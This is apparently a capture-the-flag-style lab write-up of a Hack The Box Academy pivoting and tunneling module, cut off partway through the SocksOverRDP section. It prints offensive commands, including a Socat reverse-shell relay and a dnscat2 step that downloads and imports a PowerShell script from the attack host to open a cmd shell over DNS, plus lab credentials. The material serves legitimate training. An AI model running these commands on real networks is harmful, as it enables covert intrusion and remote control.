**HTB Academy — Module 158 | Complete 18-Section Technical Write-Up**

**Authoring format:** NERO.SEC / independent lab notes  
**Track:** Offensive Security · Network Pivoting · Intermediate  
**Primary reference:** <https://academy.hackthebox.com/app/module/158>  
**Evidence:** 26 screenshots submitted as an archive; 14 clearly match the pivoting exercises, and 12 appear to belong to a different services-enumeration lab.  
**Lab date:** November 2026 (screenshots)  
**Scope note:** Commands and credentials apply to the explicitly authorized Hack The Box Academy lab environment, not production infrastructure.

> **Verification policy.** “Verified” means that an actual supplied screenshot or terminal output demonstrates the step. “Practiced / partial” means the conversation includes an attempted workflow but not the successful final outcome. “Reference only” means a demonstration or answer was discussed without matching primary evidence. “Evidence pending” means no matching image was provided. Do not confuse section coverage with completed exercises.

## Executive summary

Pivoting uses a reachable host to communicate with otherwise inaccessible network segments. Port forwarding binds a local or remote socket and redirects its TCP stream, while tunneling carries one protocol inside another. The module progresses from network inspection and SSH proxies to Meterpreter, Socat, sshuttle, rpivot, Windows portproxy, DNS/ICMP transport, Chisel and RDP virtual channels. The final assessment strings several hops together from an exposed web application to internal Windows hosts and a domain controller.

The submitted evidence establishes actual success for SSH local forwarding, rpivot, Windows Netsh portproxy, dnscat2, and ptunnel-ng over ICMP. It captures an unsuccessful Chisel build due to GLIBC mismatch, a partially attempted SocksOverRDP scenario, and Q1/Q2 of the Skills Assessment. All eighteen sections are explained below, even where a screenshot or completed result is pending.

### Evidence and outcome overview

| Section | Evidence from ZIP | Verified outcome / caveat |
|---|---|---|
| Introduction / Networking | 14, 15 | Dual-homed Ubuntu; route and ping context |
| Dynamic SSH SOCKS | None direct | Conceptual; local `ssh -L` evidence belongs to forwarding |
| SSH remote/reverse forwarding | 13, 14 | Local forwarding verified; remote `-R` not pictured |
| Meterpreter and AutoRoute | None | Reference only; no Meterpreter session screenshot |
| Socat reverse / bind | None | Theory and lab questions; shells not pictured |
| Plink | None | Evidence pending |
| sshuttle | None | Procedure described; connection not pictured |
| Rpivot | 16, 17 | SOCKS proxy and internal HTTP page verified |
| Windows Netsh | 18, 19 | Portproxy, RDP and `VendorContacts.txt` verified |
| Dnscat2 | 20 | DNS-based command session and flag verified |
| Chisel | 21 | GLIBC incompatibility demonstrated; completed SOCKS5 not pictured |
| ICMP / ptunnel-ng | 22–25 | Packet-level troubleshooting and final RDP flag verified |
| SocksOverRDP | None in ZIP | Missing DLL during earlier attempt; final RDP not verified |
| Skills Assessment | 26 | Q1/Q2 credentials verified; Q3–Q7 not verified in evidence |
| Detection / Beyond | None | Conceptual material |

## 01 — Introduction to Pivoting, Tunneling, and Port Forwarding

### Objective and terminology

The first lesson establishes three distinct ideas. **Lateral movement** is movement across systems after an initial foothold, typically by reusing credentials, sessions, or trust relationships. **Pivoting** is using one host as a route to a different network segment. **Tunneling** is encapsulating or relaying traffic through another communication channel so that traffic crosses a boundary it otherwise could not traverse. **Port forwarding** is the narrower case of exposing one socket and redirecting its traffic to another host/port.

A pivot host may also be called a jump host, foothold or beachhead. A **dual-homed** system has interfaces on at least two networks, and thus often makes a practical pivot. The distinction is operationally important: discovering `172.16.5.19` from a web server is not evidence that Pwnbox can connect to that IP directly; reachability must be established through a route or proxy.

### Practical checklist

```bash
# Linux foothold: identity, addresses, routing, listeners
id && hostname
ip -br address
ip route
ss -lntup

# Windows foothold: identity, interfaces, routing and reachable services
whoami
ipconfig /all
route print
netstat -ano
```

Map the network as **Attack Host → Pivot Host → Internal Target**. Record exact interfaces, usernames, source/destination ports and whether connections are established from the attacker side or as a reverse connection. When a command uses `127.0.0.1`, identify which machine owns that loopback interface; it is never a universal address shared by the whole lab.

### Evidence and learning outcome

In the provided practice, Pwnbox was assigned `10.10.14.106` on the HTB VPN; different lab instances had pivot addresses `10.129.12.173`, `10.129.12.238`, `10.129.251.22` and other ephemeral IPs. These are **different target deployments**, not interchangeable connection endpoints. A single topology must always use the active target IP shown in HTB Academy. **Evidence pending:** no standalone screenshot of the introductory theory page.

## 02 — The Networking Behind Pivoting

### Network interfaces and route selection

To pivot correctly, first interpret interface listings and destination routes. On an Ubuntu WEB01 instance, the host had:

```text
lo       127.0.0.1/8
ens192   10.129.12.173/16
ens224   172.16.5.129/23
```

There are **three interfaces including loopback**. `ens192` faces the HTB attack network, and `ens224` attaches to the internal network. A `/23` mask equals `255.255.254.0`, so the canonical internal route is `172.16.4.0/23`; that range contains `172.16.5.19`. A static route often matters more than whether a host replies to ICMP.

```bash
ip -br addr
ip route
ip route get 172.16.5.19
nc -zv 172.16.5.19 3389
```

The observed `nc` output stated that TCP/3389 on `172.16.5.19` was reachable **from WEB01**, which justified attempting RDP through that host. On a VPN-connected Pwnbox, `tun0` may carry HTB `10.129.0.0/16` routes, while the default gateway follows a separate NIC. Linux route selection uses the most-specific matching prefix, not simply the default gateway every time.

### Ping-sweep caution

A sweep launched on Pwnbox before configuring the pivot can return no results even if the destination exists. Run discovery on the host that actually has internal network access:

```bash
# On the authorized Ubuntu pivot
for i in $(seq 1 254); do
  (ping -c 1 -W 1 "172.16.5.$i" 2>/dev/null | grep 'bytes from') &
done
wait
```

`nmap -sn -n 172.16.5.0/24` is another option when permitted. A host can block ping; a missing reply is not proof of inactivity. Also note that route syntax `172.16.5.0/255.255.254.0` may appear in a course exercise, but normalized CIDR for the same `/23` network is `172.16.4.0/23`.

### Screenshot — interface context and reachability



![Evidence 14: Ubuntu dual-homed interface listing, successful port-3389 probe, and SSH forwarding context](/writeups/evidence/htb-pivoting-tunneling-port-forwarding/evidence-14.jpg "Ubuntu dual-homed interface listing, successful port-3389 probe, and SSH forwarding context")



**Observed:** `ens224` shows an internal address and `nc -zv 172.16.5.19 3389` succeeds. **Evidence 15** captures a sweep attempt from the wrong host, illustrating why pivot placement matters.



![Evidence 15: Ping sweep from Pwnbox with no usable results before routing is established](/writeups/evidence/htb-pivoting-tunneling-port-forwarding/evidence-15.jpg "Ping sweep from Pwnbox with no usable results before routing is established")



## 03 — Dynamic Port Forwarding with SSH and SOCKS Tunneling

### Mechanism

SSH's `-D` creates a local SOCKS listener. Applications connect to that SOCKS port, and the SSH server initiates destination connections in the network reachable from the pivot. Unlike `-L`, which maps one fixed destination, `-D` can carry traffic to multiple destinations. SOCKS5 is a proxy protocol; it is not an encrypted tunnel by itself. The enclosing SSH transport supplies encryption here.

### Reproducible workflow

```bash
# Attack Host (Pwnbox); replace PIVOT_IP for the active instance
ssh -D 9050 -N -p 22 ubuntu@PIVOT_IP

# In a second Pwnbox terminal
ss -lnt | grep ':9050'
printf 'strict_chain\nproxy_dns\n[ProxyList]\nsocks5 127.0.0.1 9050\n' > /tmp/pivot-proxychains.conf
proxychains4 -f /tmp/pivot-proxychains.conf nc -zv -w 5 172.16.5.19 3389
proxychains4 -f /tmp/pivot-proxychains.conf xfreerdp /v:172.16.5.19 /u:victor /p:'pass@123' /cert:ignore
```

If FreeRDP 3 is installed, replace `xfreerdp` with `xfreerdp3`. Check listener ownership with `ss`; `127.0.0.1:9050` must exist **on Pwnbox**. `proxychains4` only proxies supported TCP sockets; DNS handling needs deliberate configuration, and UDP generally is not tunneled by an ordinary SSH SOCKS proxy.

### Troubleshooting and verification

`Connection refused` on port 9050 means no SOCKS listener or a process bound to the wrong host. A connected SSH `-N` command normally remains silent rather than returning a prompt. If the target is reachable only from the internal pivot, the proxy test should succeed while the equivalent direct Pwnbox TCP test fails.

**Status:** technique covered and commands established; no ZIP image demonstrates a complete `ssh -D` SOCKS5 test. **Evidence Pending — dynamic SSH SOCKS session.**

## 04 — Remote/Reverse Port Forwarding with SSH

### The three forwarding modes

- **Local (`-L`)**: listen on the attacker's machine; the remote SSH server connects to one target service.
- **Remote (`-R`)**: listen on the SSH server side; a connection is relayed back through the SSH client to a service reachable from the client's side.
- **Dynamic (`-D`)**: expose a local SOCKS endpoint that supports many destinations.

For this lab, `ssh -L` was verified as the most direct route from Pwnbox to the Windows RDP target:

```bash
# Pwnbox → Ubuntu WEB01 → Windows DC
ssh -L 13389:172.16.5.19:3389 ubuntu@10.129.12.173 -N

# Separate Pwnbox terminal
xfreerdp /v:127.0.0.1:13389 /u:victor /p:'pass@123' /cert:ignore
```

An **illustrative** reverse-forward example, not demonstrated in the uploaded screenshots, is:

```bash
# On a pivot host, forwarding a local service back to an authorized SSH server
ssh -N -R 18080:127.0.0.1:8080 user@ATTACK_SSH_SERVER
```

The `-R` listener defaults to loopback on the SSH server, subject to server `GatewayPorts` and `AllowTcpForwarding` settings. `-L` and `-R` have different listener locations; transposing those concepts is a common cause of failed labs.

### Verified lab outcome

The Windows account `victor` accessed `C:\Users\victor\Desktop\flag.txt.txt`. The filename had **two `.txt` extensions**. The screenshot clearly shows:

```cmd
type C:\Users\victor\Desktop\flag.txt.txt
```

**Recorded flag:** `N1c3Pivot`.



![Evidence 13: RDP desktop and CMD output reading flag.txt.txt after SSH forwarding](/writeups/evidence/htb-pivoting-tunneling-port-forwarding/evidence-13.jpg "RDP desktop and CMD output reading flag.txt.txt after SSH forwarding")





![Evidence 14 (Context): The preceding Ubuntu network and SSH local port-forward commands](/writeups/evidence/htb-pivoting-tunneling-port-forwarding/evidence-14b.jpg "The preceding Ubuntu network and SSH local port-forward commands")



**Status:** local forwarding **Verified**; reverse `-R` forwarding **Evidence Pending**.

## 05 — Meterpreter Tunneling & Port Forwarding

### Meterpreter routing model

A Meterpreter foothold can act as a transport for internal TCP access. After establishing an authorized Meterpreter session on a dual-homed pivot, Metasploit `autoroute` tells framework modules which private subnet should be reached via that session. It does **not** automatically alter the OS routing table on Pwnbox. For tools outside Metasploit, use Metasploit's SOCKS proxy module plus ProxyChains.

### Ordered workflow (illustrative; no session capture provided)

```text
msf6 > sessions
msf6 > sessions -i SESSION_ID
meterpreter > ipconfig
meterpreter > run autoroute -s 172.16.4.0/23
meterpreter > run autoroute -p
```

An equivalent modern Metasploit module is `post/multi/manage/autoroute`. Then run a SOCKS proxy inside Metasploit:

```text
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
msf6 auxiliary(server/socks_proxy) > run -j
```

Configure `proxychains4` with the resulting SOCKS listener and test a specific internal TCP service. A simple Meterpreter static forward is also possible:

```text
meterpreter > portfwd add -l 13389 -p 3389 -r 172.16.5.19
```

`portfwd` maps one service, while an AutoRoute/SOCKS setup generalizes access to multiple destinations.

### Answer interpretation

The course's Windows target `172.16.5.19` lies within `172.16.4.0/23`, netmask `255.255.254.0`. The earlier conversation cited the formatted route `172.16.5.0/255.255.254.0`; distinguish an exercise's displayed entry from the mathematically normalized network address. The `run autoroute -p` command belongs at a **Meterpreter prompt**, not inside Linux Bash. Hence `bash: run: command not found` indicates the wrong execution context.

**Status:** discussed and practiced conceptually; **Evidence Pending — no Meterpreter session, Route table, or internal connection screenshot in this ZIP.**

## 06 — Socat Redirection with a Reverse Shell

### Purpose

Socat is a bidirectional relay between arbitrary sockets and streams. It can accept a TCP connection on a dual-homed pivot and forward the bytes to a listener on another machine. Socat does **not** depend on SSH tunneling; no SSH process is required for a Socat-only relay.

### Example traffic flow

```text
Internal Windows host ──TCP──> Ubuntu WEB01:8080 ──TCP──> Pwnbox:4444
```

Run the listener on the authorized attack host:

```bash
nc -lvnp 4444
```

On Ubuntu WEB01, forward incoming TCP/8080 to the attacker listener:

```bash
socat TCP4-LISTEN:8080,reuseaddr,fork TCP4:ATTACK_VPN_IP:4444
```

Only after those listeners are ready should the controlled Windows host's authorized test payload connect to `WEB01:8080`. Observe the Socat terminal and the receiving listener to establish that the connection is genuinely traversing the pivot. Prefer lab-specific test traffic and never infer that a shell exists simply because a TCP relay is listening.

### Failure modes

`Address already in use` indicates an existing port listener. `Connection refused` means the next hop has no listening service or is blocked. `0.0.0.0` binds a listener on all local IPv4 interfaces; it is **not** an actual destination address to which a reverse payload can connect. Scope listeners to the permitted interface when possible.

**Status:** Socat's no-SSH requirement discussed in the exercise. **Evidence Pending — reverse shell listener and successful session.**

## 07 — Socat Redirection with a Bind Shell

### Bind-versus-reverse distinction

A reverse shell calls **out** from the internal target toward a listener. A bind shell listens **on the target**, and the operator connects **in**. The bind model often needs port redirection because the internal target is not directly reachable from Pwnbox.

The Meterpreter payload named in the practice question was:

```text
windows/x64/meterpreter/bind_tcp
```

That is a payload identifier, not proof that a specific bind shell was actually started. Given an authorized internal listener on TCP/4444, Socat can publish a relay on the pivot:

```bash
# On Ubuntu WEB01
socat TCP4-LISTEN:8080,reuseaddr,fork TCP4:172.16.5.19:4444
```

A client connecting to `WEB01:8080` reaches the pre-existing service on `172.16.5.19:4444`. This forwarding step **does not create the target listener**. Configure the matching Metasploit handler for the specific exercise only after verifying that service and payload match.

### Validation and defensive note

A TCP connect probe tells you if the relay is reachable; it does not establish authenticated command execution. Capture server-side listen state and client-side connection evidence separately. From a defender perspective, unusual pivot-host listeners and flows to internal systems are highly visible in socket inventories and network flow logs.

**Status:** payload answer recorded; **Evidence Pending — Socat bind session and handler output.**

## 08 — SSH for Windows: plink.exe

### Why Plink matters

`plink.exe` is the PuTTY command-line SSH client for Windows. In an environment where a Windows jump host can reach a Linux SSH server, Plink can establish local, remote or dynamic SSH forwarding without requiring OpenSSH Client to be installed. Its tunnel direction follows the same SSH principles as Linux `ssh`.

### Practical setup

After obtaining Plink from the legitimate PuTTY distribution and staging it on the **authorized Windows pivot**, check available switches:

```cmd
plink.exe -V
plink.exe -h
```

For an SSH dynamic SOCKS listener on the Windows host:

```cmd
plink.exe -ssh -l ubuntu -D 127.0.0.1:1080 -N PIVOT_SSH_IP
```

Plink prompts for the password and may display a host-key trust prompt on the first connection. Verify the host key before accepting it. Do not blindly append flags that disable identity checks. `-N` suppresses an interactive remote command; it does not mean the network connection failed if the process stays open.

### Check on Windows

```cmd
netstat -ano | findstr :1080
```

Configure a SOCKS-aware application (such as Proxifier) to use `127.0.0.1:1080`. Check the remote server is actually able to reach the desired internal destination. If the target is a Windows domain machine, credentials and RDP reachability still have to be validated separately.

### Troubleshooting

A silent console is typical for a successful tunnel; `Connection refused` suggests a missing SSH listener, a blocked route or an incorrect port. Misconfigured Windows Defender Firewall and EDR application controls may prevent the executable from starting or binding. Verify the process and the socket before trying downstream traffic. Avoid command-line plaintext passwords if possible; a visible process command line could expose them.

**Status:** full procedure documented; **Evidence Pending — no Plink-related screenshot or Windows SOCKS listener was in the ZIP.**

## 09 — SSH Pivoting with sshuttle

### Mechanism

`sshuttle` implements a transparent, SSH-based TCP forwarding approach for specified subnets. Unlike configuring `proxychains4` per application, sshuttle can redirect selected connections with local firewall rules. It requires SSH connectivity to the pivot and Python on the remote host. It is not a true layer-3 VPN, and full ICMP/UDP support must not be assumed.

### Lab walk-through

On Pwnbox, connect through WEB01 to the Windows network using the host address from the active HTB deployment:

```bash
sshuttle -r ubuntu@PIVOT_IP 172.16.4.0/23 -v
```

For the earlier WEB01 instance (`10.129.12.173`), the example used `172.16.5.0/24`; that narrower range includes `172.16.5.19` and is sufficient for the one target. Keep the sshuttle terminal alive and launch RDP from a separate Pwnbox terminal:

```bash
xfreerdp /v:172.16.5.19 /u:victor /p:'pass@123' /cert:ignore
```

The key difference from an SSH `-L` RDP relay is that the RDP client specifies the **real internal IP**, rather than a local forwarded port. Validate the destination independently with `nc -zv 172.16.5.19 3389` while sshuttle is running.

### Limitations and cleanup

If sshuttle reports firewall-rule creation errors, the attacker workstation may not have sufficient local privileges. If it establishes an SSH session but new TCP connections hang, inspect sshuttle's selected subnet and whether its remote Python interpreter launches. Terminate with `Ctrl+C` to allow it to clean up rules.

**Recorded assessment response:** `I tried sshuttle` was the exercise's literal completion phrase, not a technical flag or evidence of RDP success. **Evidence Pending — no screenshot of an active sshuttle session or RDP through it.**

## 10 — Web Server Pivoting with Rpivot

### Objective and architecture

Rpivot creates a **reverse SOCKS proxy**: its server runs on **Pwnbox (Attack Host)** and its client runs on **Ubuntu WEB01 (Pivot Host)**. The client establishes an outbound TCP connection back to the attack host, which then makes the pivot's internal network reachable via a local SOCKS listener. The exercise target was the web server `172.16.5.135:80`.

### Step-by-step lab reproduction

Prepare the legacy Python-2 project in the training environment. On Pwnbox:

```bash
git clone https://github.com/klsecservices/rpivot.git
scp -r rpivot ubuntu@10.129.251.22:/home/ubuntu/
cd rpivot
python2 server.py --server-ip 0.0.0.0 --server-port 9999 --proxy-port 9050
```

Keep the server terminal open. On Ubuntu WEB01:

```bash
cd ~/rpivot
python2 client.py --server-ip 10.10.14.106 --server-port 9999
```

The IP after `--server-ip` on the **client** must be the attack host's reachable address, not Ubuntu's own pivot IP. The user initially configured `--server-ip 10.129.251.22`, resulting in repeated `Code 111: Connection refused`. Correcting it to `10.10.14.106` produced the confirmed incoming connection on the Pwnbox server.



![Evidence 16: Original client failure, corrected server.py and client.py placement, and new incoming connection](/writeups/evidence/htb-pivoting-tunneling-port-forwarding/evidence-16.jpg "Original client failure, corrected server.py and client.py placement, and new incoming connection")



### Verify via the SOCKS proxy

On Pwnbox, make an HTTP request through the SOCKS4 listener:

```bash
curl --socks4 127.0.0.1:9050 http://172.16.5.135/
curl -s --socks4 127.0.0.1:9050 http://172.16.5.135/ | grep -i '<title>'
```

The supplied screenshot shows an Apache HTML response; its page title contains the lab answer **`I_L0v3_Pr0xy_Ch@ins`**. The HTTP response verifies an actual proxied request rather than merely an open local port.



![Evidence 17: curl --socks4 reaches the internal server; the page title contains the exercise flag](/writeups/evidence/htb-pivoting-tunneling-port-forwarding/evidence-17.jpg "curl --socks4 reaches the internal server; the page title contains the exercise flag")



### Key troubleshooting lessons

`server.py` and `client.py` must run on opposite machines. Do not issue both on WEB01. The attack host must be reachable from WEB01 on TCP/9999; the SOCKS proxy is **local** to Pwnbox at TCP/9050. Legacy Rpivot may require Python 2 or a carefully tested port to Python 3. A process running without errors is insufficient proof; always request an actual internal page.

**Status:** **Verified** with two images; actual internal HTTP flag observed.

## 11 — Port Forwarding with Windows: Netsh

### Why Windows portproxy works

Windows' `netsh interface portproxy` redirects an inbound **TCP** connection on one listening IP/port to a new destination. It is especially useful when a dual-homed Windows workstation can reach an internal RDP server but the attack host cannot. Portproxy is not a full SOCKS server and does not forward UDP traffic.

### Host discovery and transport check

The lab's Windows 10 pivot had `10.129.72.182` on the externally reachable network and `172.16.5.150` on its internal NIC. The internal domain server at `172.16.5.19` exposed TCP/3389.

```powershell
ipconfig
Test-NetConnection 172.16.5.19 -Port 3389
```

The screenshot explicitly reports `TcpTestSucceeded : True`, so the correct **source** of the RDP connectivity test was the Windows pivot.

### Configure the forward as Administrator

```cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.72.182 connectport=3389 connectaddress=172.16.5.19
netsh interface portproxy show v4tov4
netsh advfirewall firewall add rule name="HTB RDP Pivot 8080" dir=in action=allow protocol=TCP localport=8080
```

Expected mapping (observed):

```text
Listen on ipv4:             Connect to ipv4:
Address       Port          Address      Port
10.129.72.182 8080          172.16.5.19  3389
```



![Evidence 18: Dual NICs, Test-NetConnection, successful portproxy rule and firewall rule](/writeups/evidence/htb-pivoting-tunneling-port-forwarding/evidence-18.jpg "Dual NICs, Test-NetConnection, successful portproxy rule and firewall rule")



### Use the proxy and obtain the artifact

Back on **Pwnbox**:

```bash
xfreerdp /v:10.129.72.182:8080 /u:victor /p:'pass@123' /cert:ignore
```

Once RDP opens the DC desktop, use CMD on the **DC**, not the Windows 10 pivot:

```cmd
dir "C:\Users\victor\Desktop\Approved Vendors"
type "C:\Users\victor\Desktop\Approved Vendors\VendorContacts.txt"
```

The text names **Jim Flipflop** as the approved incident contact, confirmed by a screenshot. The first attempt to read the file on the pivot failed because the file resides on the **remote DC**.



![Evidence 19: VendorContacts.txt read successfully from the Victor RDP session](/writeups/evidence/htb-pivoting-tunneling-port-forwarding/evidence-19.jpg "VendorContacts.txt read successfully from the Victor RDP session")



### Cleanup / operational caution

Remove the forward and rule after the assessment:

```cmd
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=10.129.72.182
netsh advfirewall firewall delete rule name="HTB RDP Pivot 8080"
```

**Status:** **Verified**, including RDP application use and retrieved contact.

## 12 — DNS Tunneling with Dnscat2

### Mechanism and purpose

Dnscat2 transports an interactive command channel in DNS traffic. A Ruby dnscat2 server runs on Pwnbox while a Windows PowerShell dnscat2 client communicates over UDP/53. This is different from redirecting HTTP using SOCKS: the DNS exchanges themselves carry the remote channel. A pre-shared secret can authenticate and encrypt the dnscat2 channel; both ends must use the same secret.

### Start the server on Pwnbox

```bash
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server
sudo bundle install
sudo ruby dnscat2.rb --dns host=10.10.14.106,port=53,domain=inlanefreight.local --no-cache
```

The server starts on UDP/53 and prints a session-specific secret. The screenshot used a generated value beginning `57c2c448...`. **Use the actual secret from the currently running instance**, not a placeholder or a secret from another lab.

### Transfer and execute the PowerShell client

On Pwnbox, in another terminal:

```bash
git clone https://github.com/lukebaggett/dnscat2-powershell.git
python3 -m http.server 8088 --directory ~/dnscat2-powershell
```

On the RDP Windows 10 terminal (`htb-student`):

```powershell
Invoke-WebRequest -Uri 'http://10.10.14.106:8088/dnscat2.ps1' -OutFile "$env:TEMP\dnscat2.ps1"
Import-Module "$env:TEMP\dnscat2.ps1"
Start-Dnscat2 -DNSserver 10.10.14.106 -Domain inlanefreight.local -PreSharedSecret YOUR_ACTUAL_SERVER_SECRET -Exec cmd
```

The screenshot of Pwnbox's temporary HTTP server showed `GET /dnscat2.ps1 ... 200`, confirming the file was fetched. The earlier failure was leaving the string `YOUR_SECRET` unchanged. Correcting it allowed the session to reach the server.

### Interact with the new command window

At the dnscat2 server prompt:

```text
dnscat2> windows
dnscat2> window -i WINDOW_ID
```

Use the actual command-execution window ID from `windows`. In the remote Windows CMD session:

```cmd
dir C:\Users\htb-student\Documents
type C:\Users\htb-student\Documents\flag.txt.txt
```

The supplied evidence shows the **actual filename was `flag.txt.txt`**, and the output was **`AC@tinth3Tunnel`**. The command `ls` failed because this is a Windows CMD session; `dir` is the appropriate native equivalent.



![Evidence 20: PowerShell dnscat2 client, receiving command window, and confirmed DNS tunnel flag](/writeups/evidence/htb-pivoting-tunneling-port-forwarding/evidence-20.jpg "PowerShell dnscat2 client, receiving command window, and confirmed DNS tunnel flag")



### Defender view

Investigate rare DNS record types, high request entropy, bursty TXT/CNAME lookups, repeated labels and DNS queries to unexpected resolvers. Keep logs for both the resolver and the endpoint process initiating the requests. Restrict DNS egress to authorized resolvers where practical.

**Status:** **Verified** with live Windows shell and file output.

## 13 — SOCKS5 Tunneling with Chisel

### Architecture

Chisel uses an HTTP/WebSocket transport with SSH-like session handling to carry port forwards and a SOCKS proxy. In this lab the **Ubuntu pivot** is the Chisel server (listening TCP/1234) and **Pwnbox** is the client, exposing the SOCKS listener locally on TCP/1080.

### Prepare and start the server

```bash
# Pwnbox: inspect and transfer a compatible binary
command -v chisel
scp /path/to/chisel-compatible ubuntu@10.129.12.238:/home/ubuntu/chisel

# Ubuntu WEB01
chmod +x ~/chisel
./chisel server --socks5 -p 1234 -v
```

Start the Pwnbox client:

```bash
chisel client -v 10.129.12.238:1234 socks
ss -lnt | grep ':1080'
```

Create a narrow ProxyChains configuration and access the RDP target:

```bash
printf 'strict_chain\nproxy_dns\n[ProxyList]\nsocks5 127.0.0.1 1080\n' > /tmp/chisel-proxy.conf
proxychains4 -f /tmp/chisel-proxy.conf nc -zv -w 5 172.16.5.19 3389
proxychains4 -f /tmp/chisel-proxy.conf xfreerdp /v:172.16.5.19 /u:victor /p:'pass@123' /cert:ignore
```

### Real compatibility failure and remedy

The supplied image proves Ubuntu could **not** execute the copied Chisel binary:

```text
version `GLIBC_2.32' not found
version `GLIBC_2.34' not found
```



![Evidence 21: Chisel binary fails due to incompatible GLIBC symbols on the older Ubuntu WEB01](/writeups/evidence/htb-pivoting-tunneling-port-forwarding/evidence-21.jpg "Chisel binary fails due to incompatible GLIBC symbols on the older Ubuntu WEB01")



This is a **binary compatibility** issue, not a wrong Chisel port or VPN route. Do not update libc on the target to fix an exercise tool; instead use a binary compatible with the old distribution, or build a non-CGO Go binary on Pwnbox when the project source and Go toolchain permit:

```bash
# Build example on Pwnbox after cloning the project's source
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -trimpath -ldflags='-s -w' -o chisel-static .
file chisel-static
```

Transfer the rebuilt binary, test its own `--version`, start the server, and only then run the client. The account earlier identified a reference flag `Th3$eTunne1$@rent8oring!`; **that flag is a reference answer, not verified in the provided ZIP**.

**Status:** **Practiced / partial**, GLIBC blocker verified; successful Chisel SOCKS5-to-RDP session **Evidence Pending**.

## 14 — ICMP Tunneling with SOCKS (ptunnel-ng)

### Goal and transport

`ptunnel-ng` forwards TCP streams through ICMP packets. The conceptual course flow is **Pwnbox → ICMP → Ubuntu WEB01 → internal service**. One approach carries SSH over ICMP and then uses SSH `-D` to expose SOCKS. Because SSH over the ICMP link repeatedly failed in the recorded attempt, the successful lab used **direct TCP RDP forwarding inside ICMP** instead. This is still ICMP tunneling and achieved the same practical Windows target access, but it is not evidence of a working SOCKS chain.

### Initial attempted SSH-over-ICMP route

```bash
# Ubuntu WEB01, initially targeting port 22
sudo ./ptunnel-ng -r10.129.12.238 -R22

# Pwnbox, local TCP/2222 to the ICMP peer
sudo ./ptunnel-ng -p10.129.12.238 -l2222 -r10.129.12.238 -R22

# Pwnbox, SSH through the ICMP tunnel
ssh -v -p 2222 ubuntu@127.0.0.1
```

This approach exchanged part of the SSH key negotiation but disconnected. Screenshot logs include `Packet discarded - outside receive window`, `Received session close from remote peer`, and `Connection closed by 127.0.0.1 port 2222`. These logs show **partial transport**, not authenticated shell success.



![Evidence 22: Initial SSH-over-ICMP and ptunnel client setup](/writeups/evidence/htb-pivoting-tunneling-port-forwarding/evidence-22.jpg "Initial SSH-over-ICMP and ptunnel client setup")





![Evidence 23: ptunnel session creation, SSH key exchange progress and premature disconnect](/writeups/evidence/htb-pivoting-tunneling-port-forwarding/evidence-23.jpg "ptunnel session creation, SSH key exchange progress and premature disconnect")



### Build/library failure and how it was resolved

The initial `ptunnel-ng` executable on old Ubuntu required `libcrypto.so.3` and newer GLIBC versions, which were unavailable. The user subsequently verified an actually static executable:

```text
file ptunnel-ng   → ELF 64-bit ... statically linked
ldd ptunnel-ng    → not a dynamic executable
```

A prior suggestion to enable `-L ens192` / `-L tun0` also produced `[err]: pcap: feature not supported`, because the compiled binary did not include that optional feature. **The eventual successful route did not need `-L`.**

### Successful approach — Direct RDP-over-ICMP

Restart the processes on the **correct machines**:

```bash
# Ubuntu WEB01, ICMP receiving side
cd ~/ptunnel-ng/src
sudo ./ptunnel-ng -r172.16.5.19 -R3389 -v 2
```

```bash
# Pwnbox, ICMP sending side; opens a local TCP socket
cd ~/ptunnel-ng/src
sudo ./ptunnel-ng -p10.129.12.238 -l13389 -r172.16.5.19 -R3389 -v 2
```

Then on a separate Pwnbox terminal:

```bash
nc -zv -w 10 127.0.0.1 13389
xfreerdp /v:127.0.0.1:13389 /u:victor /p:'pass@123' /cert:ignore /bpp:16
```

Earlier attempts had the **server and client reversed**: ptunnel was started as the server on Pwnbox and client on Ubuntu, making the RDP connection fail. After correcting the placement, the RDP desktop opened. The real target file was `C:\Users\victor\Downloads\flag.txt.txt`, not `flag.txt`.

```cmd
dir C:\Users\victor\Downloads
type C:\Users\victor\Downloads\flag.txt.txt
```

**Verified flag:** `N3Tw0rkTunnelV1sion!`.



![Evidence 24: ICMP session and RDP troubleshooting across both hosts](/writeups/evidence/htb-pivoting-tunneling-port-forwarding/evidence-24.jpg "ICMP session and RDP troubleshooting across both hosts")





![Evidence 25: Working FreeRDP session through TCP/13389 and confirmed flag in Downloads](/writeups/evidence/htb-pivoting-tunneling-port-forwarding/evidence-25.jpg "Working FreeRDP session through TCP/13389 and confirmed flag in Downloads")



### Key lessons

Keep both ptunnel processes alive, and identify which host owns the local listening TCP port. A successful initial TCP handshake does not guarantee a stable RDP session: the transport can still drop packets or lose its synchronization window. Tune the RDP client for low bandwidth (`/bpp:16`) where necessary and confirm the final command output. Build static binaries only when library compatibility requires them and verify with `file`/`ldd` before deployment.

**Status:** **Verified**, via direct RDP carried by ICMP; SOCKS-over-SSH variant **incomplete**.

## 15 — RDP and SOCKS Tunneling with SocksOverRDP

### Objective

SocksOverRDP uses a **Dynamic Virtual Channel (DVC)** inside an existing RDP connection to provide a SOCKS proxy on the client. This is useful in a Windows-only jump chain where the first Windows workstation can RDP to an intermediate Windows server, and that intermediate server can reach an even deeper target. In the exercise, the route was:

```text
Pwnbox → RDP → Windows 10 (10.129.42.198, htb-student)
      → RDP + SocksOverRDP → DC (172.16.5.19, victor)
      → SOCKS5 → Windows server (172.16.6.155, jason)
```

### Component placement

1. `SocksOverRDP-Plugin.dll` belongs on the **RDP client** (Windows 10). This DLL is registered locally and then loaded by `mstsc.exe`.
2. `SocksOverRDP-Server.exe` belongs on the **remote RDP server** (the intermediate Windows DC). It activates the dynamic virtual channel.
3. **Proxifier** belongs on the machine that will originate the proxied application connections (Windows 10); it can force a new `mstsc.exe` connection to the deeper target through the SOCKS endpoint `127.0.0.1:1080`.

The first step is to download the matching x64/x86 DLL and EXE from the official NCC Group release and stage them on the correct Windows hosts. A binary for the wrong architecture can fail to register or load.

### Step-by-step procedure

RDP into the reachable Windows pivot from Pwnbox. The `/drive:` option can help stage files from a trusted local folder:

```bash
xfreerdp /v:10.129.42.198 /u:htb-student /p:'HTB_@cademy_stdnt!' /cert:ignore /drive:transfer,$HOME/Downloads
```

On Windows 10, open **Administrator Command Prompt** and register the full path to the plugin:

```cmd
regsvr32.exe "C:\Users\htb-student\Desktop\Tools\SocksOverRDP-Plugin.dll"
